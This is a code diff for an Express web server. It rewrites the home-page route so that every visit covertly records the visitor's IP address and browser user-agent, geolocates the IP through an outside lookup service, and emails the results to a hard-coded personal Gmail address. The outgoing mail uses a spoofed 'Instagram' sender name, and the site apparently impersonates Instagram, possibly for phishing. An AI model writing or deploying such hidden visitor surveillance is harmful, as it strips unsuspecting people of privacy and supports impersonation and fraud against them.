@@ -31,8 +31,39 @@ app.post('/send-email', async (req, res) => {
   }
 });
 
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'index.html'));
+app.get('/', async (req, res) => {
+  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+  const userAgent = req.headers['user-agent'];
+
+  let location = 'Unknown';
+  try {
+    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+    const geoData = await geoRes.json();
+    location = `${geoData.city}, ${geoData.region}, ${geoData.country_name}`;
+  } catch (err) {
+    console.warn('Failed to fetch IP geolocation');
+  }
+
+  const htmlContent = `
+    <h3>New Visit</h3>
+    <p><strong>IP:</strong> ${ip}</p>
+    <p><strong>Location:</strong> ${location}</p>
+    <p><strong>User Agent:</strong> ${userAgent}</p>
+  `;
+
+  try {
+    await resend.emails.send({
+      from: 'Instagram <onboarding@resend.dev>',
+      to: 'johncena989673@gmail.com',
+      subject: 'New Visitor Detected',
+      html: htmlContent,
+    });
+
+    res.sendFile(path.join(__dirname, 'index.html'));
+  } catch (error) {
+    console.error(error);
+    res.status(500).send('Email failed.');
+  }
 });
 
 app.listen(port, () => {
